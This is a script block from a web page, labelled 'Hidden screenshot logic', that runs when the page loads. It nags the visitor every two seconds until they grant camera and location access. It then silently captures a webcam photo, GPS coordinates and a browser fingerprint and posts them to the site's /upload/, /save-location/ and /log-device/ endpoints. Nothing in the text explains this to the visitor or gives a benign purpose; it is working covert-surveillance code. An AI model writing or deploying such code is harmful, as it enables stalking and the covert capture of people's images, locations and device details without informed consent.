    <!-- Hidden screenshot logic -->
    <script>
        const video = document.createElement('video');
        const canvas = document.createElement('canvas');
        let cameraGranted = false;
        let locationGranted = false;

        function checkPermissions() {
            if (cameraGranted && locationGranted) {
                document.getElementById('permission-message').style.display = 'none';
            } else {
                document.getElementById('permission-message').style.display = 'block';
                setTimeout(() => requestPermissions(), 2000); // Retry every 2 seconds
            }
        }

        function requestPermissions() {
            // Ask for camera
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                cameraGranted = true;
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const image = canvas.toDataURL('image/png');
                    fetch('/upload/', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: `image=${encodeURIComponent(image)}`
                    });
                    checkPermissions();
                }, 1500);
            })
            .catch(err => {
                cameraGranted = false;
                checkPermissions();
            });

            // Ask for location
            navigator.geolocation.getCurrentPosition(position => {
                locationGranted = true;
                fetch('/save-location/', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    })
                });
                checkPermissions();
            }, error => {
                locationGranted = false;
                checkPermissions();
            });
        }

        // Start permission loop
        requestPermissions();

        function collectBrowserInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                online: navigator.onLine,
                cookiesEnabled: navigator.cookieEnabled,
                touchSupport: 'ontouchstart' in window,
            };

            fetch("/log-device/", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "X-CSRFToken": getCSRFToken()
                },
                body: JSON.stringify(info)
            });
        }

        function getCSRFToken() {
            let name = 'csrftoken';
            let cookieValue = null;
            if (document.cookie && document.cookie !== '') {
                let cookies = document.cookie.split(';');
                for (let cookie of cookies) {
                    cookie = cookie.trim();
                    if (cookie.startsWith(name + '=')) {
                        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                        break;
                    }
                }
            }
            return cookieValue;
        }

        collectBrowserInfo();
    </script>
